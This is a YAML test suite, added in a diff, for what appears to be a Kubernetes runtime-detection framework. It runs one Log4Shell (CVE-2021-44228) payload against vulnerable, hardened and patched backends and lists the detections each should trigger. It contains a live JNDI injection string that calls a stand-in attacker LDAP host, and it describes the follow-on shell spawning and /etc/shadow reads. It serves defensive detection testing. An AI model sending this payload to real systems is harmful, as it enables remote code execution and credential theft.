@@ -1,0 +1,78 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: log4j-chain-three-scenarios
+  description: |
+    ONE payload, THREE scenarios — the active-diagnosis framework's
+    discriminator test (Log4Shell / CVE-2021-44228).
+
+    Same User-Agent string in every scenario:
+      ${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}
+
+    Same topology (chain-frontend → chain-backend → chain-postgres + a
+    cross-namespace LDAP server in attacker-ns).
+
+    What differs is the chain-backend container:
+      A = eclipse-temurin:11-jdk + log4j 2.14.1 + /bin/sh present
+      B = distroless/java11-debian11 + log4j 2.14.1 + hardened SC (RO-fs, non-root)
+      C = eclipse-temurin:11-jdk + log4j 2.17.1 (patch)
+
+    Detection narrative (with kubescape ApplicationProfile baseline learned
+    from log4j-chain-benign-baseline):
+      A: R0011 (egress to attacker:1389), R0001 (new comm /bin/sh under
+         java), R0010 (sensitive-file read /etc/shadow), R0011 again on
+         the DNS exfil egress.
+      B: R0011 (egress to attacker:1389), R1100 (failed execve ENOENT
+         — distroless has no /bin/sh, the smoking-gun "contained at exec").
+      C: nothing — log4j 2.17.1 doesn't perform JNDI substitution. The
+         JNDI literal lands in the HTTP headers and stays inert. This is
+         the negative-control scenario (clean verdict despite identical
+         payload).
+
+    Re-deploy chain-backend between scenarios (see RUNBOOK-FOR-AGENTS.md
+    step 5). The AttackSuite itself is identical across all three.
+
+target:
+  service: chain-frontend
+  namespace: log4j-poc
+  port: 8080
+  protocol: http
+
+attacks:
+  - name: s1-recon-benign-login
+    type: probe
+    http:
+      method: POST
+      path: /api/login
+      headers:
+        Content-Type: application/json
+      body: '{"user":"alice","pass":"<stolen>"}'
+    successIndicators:
+      - statusCode: 200
+    expectedDetections: []   # benign — exercises the JWT issue path
+
+  - name: s2-jndi-in-user-agent
+    type: jndi-injection
+    http:
+      method: GET
+      path: /api/products?q=test
+      headers:
+        User-Agent: '${jndi:ldap://attacker.attacker-ns.svc.cluster.local:1389/Payload}'
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      # On scenario A
+      - rule: R0011
+        target: chain-backend
+        condition: outbound to attacker.attacker-ns.svc.cluster.local:1389
+      - rule: R0001
+        target: chain-backend
+        condition: new comm /bin/sh under java parent
+      - rule: R0010
+        target: chain-backend
+        condition: sensitive file access (/etc/shadow or /var/run/secrets/*)
+      # On scenario B (replaces R0001 / R0010 above)
+      - rule: R1100
+        target: chain-backend
+        condition: failed execve ENOENT under java parent
+      # On scenario C — none expected
